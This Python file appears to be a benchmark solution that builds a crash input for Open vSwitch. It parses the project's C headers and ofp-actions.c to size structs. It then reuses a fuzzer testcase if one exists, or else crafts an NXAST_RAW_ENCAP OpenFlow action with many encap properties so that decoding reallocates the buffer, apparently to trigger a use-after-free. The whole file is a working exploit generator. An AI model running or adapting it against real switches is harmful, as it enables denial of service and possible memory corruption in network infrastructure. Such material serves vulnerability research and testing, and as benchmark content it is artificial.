import os
import re
import tarfile
from typing import Dict, List, Optional, Tuple


_PRIMITIVE_SIZES = {
    "char": 1,
    "bool": 1,
    "_Bool": 1,
    "uint8_t": 1,
    "int8_t": 1,
    "unsigned char": 1,
    "signed char": 1,
    "uint16_t": 2,
    "int16_t": 2,
    "unsigned short": 2,
    "short": 2,
    "uint32_t": 4,
    "int32_t": 4,
    "unsigned int": 4,
    "int": 4,
    "uint64_t": 8,
    "int64_t": 8,
    "unsigned long long": 8,
    "long long": 8,
    "size_t": 8,
    "ptrdiff_t": 8,
    "uintptr_t": 8,
    "intptr_t": 8,
    "ovs_be16": 2,
    "ovs_be32": 4,
    "ovs_be64": 8,
    "ovs_16aligned_be32": 4,
    "ovs_32aligned_be64": 8,
}


def _align8(n: int) -> int:
    return (n + 7) & ~7


def _strip_c_comments(s: str) -> str:
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.DOTALL)
    s = re.sub(r"//[^\n]*", "", s)
    return s


def _parse_int_literal(x: str) -> Optional[int]:
    x = x.strip()
    if not x:
        return None
    x = x.split()[0]
    x = x.rstrip("uUlL")
    try:
        return int(x, 0)
    except Exception:
        return None


class _SourceFS:
    def __init__(self, src_path: str):
        self.src_path = src_path
        self._is_dir = os.path.isdir(src_path)
        self._tar: Optional[tarfile.TarFile] = None
        self._members: List[tarfile.TarInfo] = []
        if not self._is_dir:
            self._tar = tarfile.open(src_path, "r:*")
            self._members = [m for m in self._tar.getmembers() if m.isfile()]

    def close(self) -> None:
        if self._tar is not None:
            try:
                self._tar.close()
            except Exception:
                pass
            self._tar = None

    def iter_paths(self) -> List[str]:
        if self._is_dir:
            out = []
            for root, _, files in os.walk(self.src_path):
                for fn in files:
                    p = os.path.join(root, fn)
                    rp = os.path.relpath(p, self.src_path).replace(os.sep, "/")
                    out.append(rp)
            return out
        else:
            return [m.name for m in self._members]

    def read_bytes(self, relpath: str) -> Optional[bytes]:
        if self._is_dir:
            p = os.path.join(self.src_path, relpath)
            try:
                with open(p, "rb") as f:
                    return f.read()
            except Exception:
                return None
        else:
            if self._tar is None:
                return None
            try:
                m = self._tar.getmember(relpath)
            except Exception:
                return None
            try:
                f = self._tar.extractfile(m)
                if f is None:
                    return None
                data = f.read()
                f.close()
                return data
            except Exception:
                return None

    def find_endswith(self, suffix: str) -> List[str]:
        suffix = suffix.lower()
        paths = self.iter_paths()
        return [p for p in paths if p.lower().endswith(suffix)]

    def find_contains_in_name(self, token: str) -> List[str]:
        token = token.lower()
        paths = self.iter_paths()
        return [p for p in paths if token in p.lower()]

    def read_text(self, relpath: str) -> Optional[str]:
        b = self.read_bytes(relpath)
        if b is None:
            return None
        try:
            return b.decode("utf-8", errors="ignore")
        except Exception:
            return None


class _CLayout:
    def __init__(self):
        self.typedef_sizes: Dict[str, int] = dict(_PRIMITIVE_SIZES)
        self.struct_bodies: Dict[str, str] = {}
        self._struct_sizes: Dict[str, int] = {}
        self._struct_flat_fields: Dict[str, List[Tuple[str, int, int, str]]] = {}

    def add_text(self, text: str) -> None:
        text = _strip_c_comments(text)

        for m in re.finditer(r"\btypedef\s+(?P<base>(?:struct\s+\w+\s+)?\w+)\s+(?P<name>\w+)\s*;", text):
            base = m.group("base").strip()
            name = m.group("name").strip()
            if base.startswith("struct "):
                continue
            if base in self.typedef_sizes:
                self.typedef_sizes[name] = self.typedef_sizes[base]

        for m in re.finditer(r"\bstruct\s+(\w+)\s*\{", text):
            name = m.group(1)
            start = m.end()
            depth = 1
            i = start
            while i < len(text) and depth > 0:
                c = text[i]
                if c == "{":
                    depth += 1
                elif c == "}":
                    depth -= 1
                i += 1
            if depth != 0:
                continue
            body = text[start : i - 1]
            self.struct_bodies.setdefault(name, body)

        self._struct_sizes.clear()
        self._struct_flat_fields.clear()

    def _type_size(self, t: str) -> Optional[int]:
        t = " ".join(t.strip().split())
        if t in self.typedef_sizes:
            return self.typedef_sizes[t]
        if t.startswith("enum "):
            return 4
        if t.startswith("struct "):
            st = t[len("struct ") :].strip()
            return self.sizeof_struct(st)
        return None

    def sizeof_struct(self, name: str) -> Optional[int]:
        if name in self._struct_sizes:
            return self._struct_sizes[name]
        body = self.struct_bodies.get(name)
        if body is None:
            return None

        stmts = self._split_statements(body)
        total = 0
        had_padded_macro = False

        for stmt in stmts:
            stmt = stmt.strip()
            if not stmt:
                continue
            if stmt.startswith("#"):
                continue
            if stmt.startswith("union "):
                continue
            if stmt.startswith("struct ") and "{" in stmt:
                continue

            if "OFPACT_PADDED_MEMBERS" in stmt:
                had_padded_macro = True
                inner = self._extract_macro_args(stmt, "OFPACT_PADDED_MEMBERS")
                if inner:
                    inner_stmts = self._split_statements(inner)
                    inner_total = 0
                    for ist in inner_stmts:
                        fs = self._field_size_from_decl(ist.strip())
                        if fs is not None:
                            inner_total += fs
                    total += inner_total
                continue

            fs = self._field_size_from_decl(stmt)
            if fs is not None:
                total += fs

        if had_padded_macro:
            total = _align8(total)

        self._struct_sizes[name] = total
        return total

    def _split_statements(self, body: str) -> List[str]:
        out = []
        buf = []
        depth = 0
        for c in body:
            if c == "(":
                depth += 1
            elif c == ")":
                if depth > 0:
                    depth -= 1
            if c == ";" and depth == 0:
                stmt = "".join(buf).strip()
                if stmt:
                    out.append(stmt)
                buf = []
            else:
                buf.append(c)
        stmt = "".join(buf).strip()
        if stmt:
            out.append(stmt)
        return out

    def _extract_macro_args(self, stmt: str, macro: str) -> Optional[str]:
        idx = stmt.find(macro)
        if idx < 0:
            return None
        p = stmt.find("(", idx)
        if p < 0:
            return None
        i = p + 1
        depth = 1
        while i < len(stmt) and depth > 0:
            if stmt[i] == "(":
                depth += 1
            elif stmt[i] == ")":
                depth -= 1
            i += 1
        if depth != 0:
            return None
        return stmt[p + 1 : i - 1]

    def _field_size_from_decl(self, stmt: str) -> Optional[int]:
        stmt = stmt.strip()
        if not stmt:
            return None
        stmt = re.sub(r"\bOVS_PACKED\b", "", stmt)
        stmt = re.sub(r"__attribute__\s*\(\(.*?\)\)", "", stmt)
        stmt = " ".join(stmt.split())
        if not stmt:
            return None

        stmt = re.sub(r"=\s*[^,]+", "", stmt).strip()

        m = re.match(r"^(struct\s+\w+|\w+(?:\s+\w+)*)\s+(\w+)\s*(\[\s*([0-9]+)\s*\])?$", stmt)
        if not m:
            return None
        t = m.group(1).strip()
        name = m.group(2).strip()
        arr = m.group(4)
        if name in ("OVS_PACKED",):
            return None
        n = 1
        if arr is not None:
            try:
                n = int(arr, 10)
            except Exception:
                n = 1
            if n == 0:
                return 0
        sz = self._type_size(t)
        if sz is None:
            return None
        return sz * n

    def flatten_fields(self, name: str) -> Optional[List[Tuple[str, int, int, str]]]:
        if name in self._struct_flat_fields:
            return self._struct_flat_fields[name]
        body = self.struct_bodies.get(name)
        if body is None:
            return None
        fields: List[Tuple[str, int, int, str]] = []
        offset = 0
        stmts = self._split_statements(body)
        for stmt in stmts:
            stmt = stmt.strip()
            if not stmt:
                continue
            if stmt.startswith("#"):
                continue
            if "OFPACT_PADDED_MEMBERS" in stmt:
                inner = self._extract_macro_args(stmt, "OFPACT_PADDED_MEMBERS")
                if inner:
                    inner_stmts = self._split_statements(inner)
                    for ist in inner_stmts:
                        res = self._flatten_decl(ist.strip(), offset)
                        if res is None:
                            continue
                        dfields, doff = res
                        fields.extend(dfields)
                        offset = doff
                    offset = _align8(offset)
                continue
            res = self._flatten_decl(stmt, offset)
            if res is None:
                continue
            dfields, offset = res

            fields.extend(dfields)
        self._struct_flat_fields[name] = fields
        return fields

    def _flatten_decl(self, stmt: str, offset: int) -> Optional[Tuple[List[Tuple[str, int, int, str]], int]]:
        stmt = stmt.strip()
        if not stmt:
            return None
        stmt = re.sub(r"\bOVS_PACKED\b", "", stmt)
        stmt = re.sub(r"__attribute__\s*\(\(.*?\)\)", "", stmt)
        stmt = " ".join(stmt.split())
        stmt = re.sub(r"=\s*[^,]+", "", stmt).strip()
        m = re.match(r"^(struct\s+\w+|\w+(?:\s+\w+)*)\s+(\w+)\s*(\[\s*([0-9]+)\s*\])?$", stmt)
        if not m:
            return None
        t = m.group(1).strip()
        name = m.group(2).strip()
        arr = m.group(4)
        n = 1
        if arr is not None:
            try:
                n = int(arr, 10)
            except Exception:
                n = 1
            if n == 0:
                return ([], offset)
        if t.startswith("struct "):
            st = t[len("struct ") :].strip()
            ssz = self.sizeof_struct(st)
            if ssz is None:
                return None
            out = []
            for i in range(n):
                out.append((name if n == 1 else f"{name}[{i}]", offset + i * ssz, ssz, t))
            return out, offset + n * ssz
        sz = self._type_size(t)
        if sz is None:
            return None
        out = []
        for i in range(n):
            out.append((name if n == 1 else f"{name}[{i}]", offset + i * sz, sz, t))
        return out, offset + n * sz


def _find_constant_in_text(text: str, name: str) -> Optional[int]:
    text = _strip_c_comments(text)
    m = re.search(rf"(?m)^\s*#\s*define\s+{re.escape(name)}\s+([^\n]+)$", text)
    if m:
        v = _parse_int_literal(m.group(1))
        if v is not None:
            return v
    m = re.search(rf"(?m)^\s*{re.escape(name)}\s*=\s*([^,}}]+)", text)
    if m:
        v = _parse_int_literal(m.group(1))
        if v is not None:
            return v
    return None


def _extract_function_body(text: str, func_name: str) -> Optional[str]:
    text = _strip_c_comments(text)
    idx = text.find(func_name)
    if idx < 0:
        return None
    brace = text.find("{", idx)
    if brace < 0:
        return None
    i = brace + 1
    depth = 1
    while i < len(text) and depth > 0:
        if text[i] == "{":
            depth += 1
        elif text[i] == "}":
            depth -= 1
        i += 1
    if depth != 0:
        return None
    return text[brace + 1 : i - 1]


def _best_prop_from_decode(layout: _CLayout, ofp_actions_c_text: str, header_texts: List[str]) -> Optional[Tuple[str, int, int, int]]:
    body = _extract_function_body(ofp_actions_c_text, "decode_ed_prop")
    if not body:
        return None

    header_all = "\n".join(header_texts)

    cases = list(re.finditer(r"\bcase\s+([A-Za-z_]\w*)\s*:", body))
    best = None

    for i, cm in enumerate(cases):
        cname = cm.group(1)
        start = cm.end()
        end = cases[i + 1].start() if i + 1 < len(cases) else len(body)
        block = body[start:end]

        if cname.upper() == "DEFAULT":
            continue

        cval = _find_constant_in_text(header_all, cname)
        if cval is None:
            continue

        enc_struct = None
        m = re.search(r"\bstruct\s+(ofp_ed_prop_[A-Za-z_]\w*)\b", block)
        if m:
            enc_struct = m.group(1)[len("ofp_ed_prop_") :]
            enc_struct_name = m.group(1)
        else:
            enc_struct_name = None

        int_struct_name = None
        m = re.search(r"\bstruct\s+([A-Za-z_]\w*)\s*\*\s*\w+\s*=\s*ofpbuf_put_uninit\s*\(", block)
        if m:
            int_struct_name = m.group(1)
        else:
            m = re.search(r"ofpbuf_put_uninit\s*\([^,]+,\s*sizeof\s*\(\s*struct\s+([A-Za-z_]\w*)\s*\)\s*\)", block)
            if m:
                int_struct_name = m.group(1)

        enc_sz = None
        if enc_struct_name:
            enc_sz = layout.sizeof_struct(enc_struct_name)
        if enc_sz is None:
            if enc_struct:
                enc_sz = layout.sizeof_struct("ofp_ed_prop_" + enc_struct)
        if enc_sz is None:
            continue
        if enc_sz < 8 or enc_sz > 4096:
            continue

        int_sz = None
        if int_struct_name:
            int_sz = layout.sizeof_struct(int_struct_name)
        if int_sz is None:
            int_sz = enc_sz

        delta = int_sz - enc_sz
        if best is None or delta > best[3]:
            best = (cname, cval, enc_sz, delta)

    return best


def _find_struct_name_in_text(texts: List[str], struct_name: str) -> Optional[str]:
    pat = re.compile(rf"\bstruct\s+{re.escape(struct_name)}\s*\{{")
    for t in texts:
        if pat.search(_strip_c_comments(t)):
            return t
    return None


def _set_be(buf: bytearray, off: int, size: int, val: int) -> None:
    if off < 0 or size <= 0:
        return
    if off + size > len(buf):
        return
    buf[off : off + size] = val.to_bytes(size, "big", signed=False)


class Solution:
    def solve(self, src_path: str) -> bytes:
        fs = _SourceFS(src_path)
        try:
            nicira_paths = fs.find_endswith("nicira-ext.h") + fs.find_endswith("nicira-ext.h.in")
            ofp_actions_c_paths = fs.find_endswith("ofp-actions.c")
            internal_actions_h_paths = fs.find_endswith("ofp-actions.h")

            header_paths = []
            for p in fs.iter_paths():
                pl = p.lower()
                if pl.endswith(".h") or pl.endswith(".h.in"):
                    header_paths.append(p)

            texts_cache: Dict[str, str] = {}

            def get_text(p: str) -> str:
                if p in texts_cache:
                    return texts_cache[p]
                t = fs.read_text(p)
                if t is None:
                    t = ""
                texts_cache[p] = t
                return t

            header_texts = [get_text(p) for p in header_paths if len(get_text(p)) > 0]

            layout = _CLayout()
            for t in header_texts:
                layout.add_text(t)
            for p in ofp_actions_c_paths:
                layout.add_text(get_text(p))

            header_all = "\n".join(header_texts)

            nx_vendor_id = _find_constant_in_text(header_all, "NX_VENDOR_ID")
            if nx_vendor_id is None:
                nx_vendor_id = _find_constant_in_text(header_all, "NICIRA_VENDOR_ID")
            if nx_vendor_id is None:
                nx_vendor_id = 0x00002320

            nxast_raw_encap = _find_constant_in_text(header_all, "NXAST_RAW_ENCAP")
            if nxast_raw_encap is None:
                nxast_raw_encap = _find_constant_in_text(header_all, "NXAST_RAW_ENCAP2")
            if nxast_raw_encap is None:
                nxast_raw_encap = 0

            # Try to find an existing minimized testcase in the source tree.
            vendor_be = nx_vendor_id.to_bytes(4, "big", signed=False)
            subtype_be = (nxast_raw_encap & 0xFFFF).to_bytes(2, "big", signed=False)
            small_bins: List[Tuple[int, str]] = []
            for p in fs.iter_paths():
                pl = p.lower()
                if any(tok in pl for tok in ("clusterfuzz", "testcase", "crash", "uaf", "raw_encap", "raw-encap")):
                    b = fs.read_bytes(p)
                    if b and 0 < len(b) <= 256 and (vendor_be in b):
                        small_bins.append((len(b), p))
            small_bins.sort()
            for _, p in small_bins[:5]:
                b = fs.read_bytes(p)
                if b and vendor_be in b and (subtype_be in b or nxast_raw_encap == 0):
                    return b

            ofp_actions_c_text = ""
            for p in ofp_actions_c_paths:
                t = get_text(p)
                if "decode_ed_prop" in t and "RAW_ENCAP" in t:
                    ofp_actions_c_text = t
                    break
            if not ofp_actions_c_text and ofp_actions_c_paths:
                ofp_actions_c_text = get_text(ofp_actions_c_paths[0])

            # Choose ED property case with biggest internal-expansion (heuristic).
            best = _best_prop_from_decode(layout, ofp_actions_c_text, header_texts)
            if best is None:
                # Fallback to a common property if present.
                for cand in ("OFPEDPT_ETHERNET", "OFPEDPT_IPV4", "OFPEDPT_UDP", "OFPEDPT_VLAN", "OFPEDPT_NSH", "OFPEDPT_VXLAN"):
                    cval = _find_constant_in_text(header_all, cand)
                    if cval is None:
                        continue
                    # Try to find a struct with same suffix.
                    suf = cand.split("_", 1)[1].lower().replace("ofpedpt_", "")
                    enc_struct_name = f"ofp_ed_prop_{suf}"
                    enc_sz = layout.sizeof_struct(enc_struct_name)
                    if enc_sz is None:
                        continue
                    best = (cand, cval, enc_sz, 0)
                    break

            if best is None:
                # Absolute fallback: craft something that at least reaches NX action decoding.
                # This may not trigger, but avoids exceptions.
                nx_action_header_len = 16
                action_len = 32
                b = bytearray(action_len)
                _set_be(b, 0, 2, 0xFFFF)
                _set_be(b, 2, 2, action_len)
                _set_be(b, 4, 4, nx_vendor_id)
                _set_be(b, 8, 2, nxast_raw_encap & 0xFFFF)
                return bytes(b)

            prop_type_name, prop_type_val, prop_enc_len, prop_delta = best

            # Find and size nx_action_raw_encap struct.
            nx_struct_name = "nx_action_raw_encap"
            nx_base = layout.sizeof_struct(nx_struct_name)
            if nx_base is None:
                # Try alt naming.
                nx_struct_name = "nx_action_raw_encap2"
                nx_base = layout.sizeof_struct(nx_struct_name)
            if nx_base is None:
                # Conservative guess: NX header(16) + 8 bytes fields.
                nx_base = 24

            # Size of internal encap action (best effort), to choose N.
            int_action_name = None
            for candidate in ("ofpact_raw_encap", "ofpact_encap", "ofpact_nx_raw_encap"):
                if layout.sizeof_struct(candidate) is not None:
                    int_action_name = candidate
                    break
            int_base = layout.sizeof_struct(int_action_name) if int_action_name else None
            if int_base is None:
                int_base = 16

            # Size of internal property allocation (best effort).
            int_prop_size = prop_enc_len + max(0, prop_delta)

            # Determine number of properties to increase odds that decoding reallocates.
            # If expansion is known/positive, compute minimal N for internal > encoded.
            encoded_base = nx_base
            encoded_prop = prop_enc_len
            N = 3
            if prop_delta > 0:
                needed = (encoded_base - int_base) + 1
                if needed <= 0:
                    N = 1
                else:
                    N = (needed + prop_delta - 1) // prop_delta
                    if N < 1:
                        N = 1
                if N < 2:
                    N = 2
                if N > 12:
                    N = 12
            else:
                N = 6

            # Limit overall size.
            while encoded_base + N * encoded_prop > 512 and N > 1:
                N -= 1
            if N < 1:
                N = 1

            action_len = encoded_base + N * encoded_prop
            if action_len % 8 != 0:
                pad = (8 - (action_len % 8)) % 8
                action_len += pad
            pad_tail = action_len - (encoded_base + N * encoded_prop)

            # Build base struct bytes and patch key fields by locating offsets.
            base = bytearray(max(encoded_base, 16))
            fields = layout.flatten_fields(nx_struct_name) or []
            name_to_first: Dict[str, Tuple[int, int, str]] = {}
            for fname, off, sz, t in sorted(fields, key=lambda x: x[1]):
                if fname not in name_to_first:
                    name_to_first[fname] = (off, sz, t)

            def set_field(field_name: str, value: int) -> None:
                if field_name in name_to_first:
                    off, sz, t = name_to_first[field_name]
                    _set_be(base, off, sz, value & ((1 << (8 * sz)) - 1))
                else:
                    # Try nested header: find first matching suffix.
                    for fname, off, sz, t in fields:
                        if fname.endswith("." + field_name):
                            _set_be(base, off, sz, value & ((1 << (8 * sz)) - 1))
                            return

            set_field("type", 0xFFFF)
            set_field("len", action_len)
            if "vendor" in name_to_first:
                set_field("vendor", nx_vendor_id)
            elif "experimenter" in name_to_first:
                set_field("experimenter", nx_vendor_id)
            else:
                if len(base) >= 8:
                    _set_be(base, 4, 4, nx_vendor_id)
            set_field("subtype", nxast_raw_encap & 0xFFFF)

            # Set number of properties if present.
            if "n_props" in name_to_first:
                set_field("n_props", N & 0xFFFF)
            else:
                for fname, off, sz, t in fields:
                    if fname.lower().endswith("n_props") and sz == 2:
                        _set_be(base, off, sz, N & 0xFFFF)
                        break

            # Assemble properties.
            props = bytearray()
            for _ in range(N):
                prop = bytearray(prop_enc_len)
                _set_be(prop, 0, 2, prop_type_val & 0xFFFF)
                _set_be(prop, 2, 2, prop_enc_len & 0xFFFF)
                props += prop

            out = bytes(base[:encoded_base]) + bytes(props) + (b"\x00" * pad_tail)
            if len(out) != action_len:
                if len(out) < action_len:
                    out += b"\x00" * (action_len - len(out))
                else:
                    out = out[:action_len]
            return out
        finally:
            fs.close()